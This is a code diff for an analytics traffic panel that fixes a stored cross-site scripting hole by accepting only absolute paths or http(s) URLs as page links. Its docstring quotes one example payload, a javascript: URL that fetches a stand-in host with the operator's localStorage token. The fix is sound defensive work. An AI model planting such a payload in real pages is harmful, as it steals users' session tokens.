@@ -46,6 +46,23 @@ _cache: dict[tuple, tuple[float, dict]] = {}
 _cache_lock = threading.Lock()
 
 
+
+def _page_link(domain: str, path: str) -> str | None:
+    """The link the traffic panel draws for a page path from Umami, or ``None``.
+
+    A path that was not a path used to be passed through as the link itself.
+    Umami's collect endpoint is public — any page can report any URL for a
+    tracked site — so ``javascript:fetch('//x/?'+localStorage.token)`` sent
+    there came back here as ``href``, in a panel only the operator opens, on
+    the origin that holds their session. Only an absolute path or an http(s)
+    URL is a link; anything else is shown as text.
+    """
+    if path.startswith("/") and not path.startswith("//"):
+        return f"https://{domain}{path}"
+    if path.lower().startswith(("https://", "http://")):
+        return path
+    return None
+
 def clear_cache() -> None:
     with _cache_lock:
         _cache.clear()
@@ -176,7 +193,7 @@ def traffic(
             piece = index.get((site.domain, normal))
             page = {
                 "path": path,
-                "url": f"https://{site.domain}{path}" if path.startswith("/") else path,
+                "url": _page_link(site.domain, path),
                 "views": views,
                 "is_content": piece is not None or normal.startswith(CONTENT_PREFIXES),
                 "content_id": piece["content_id"] if piece else None,
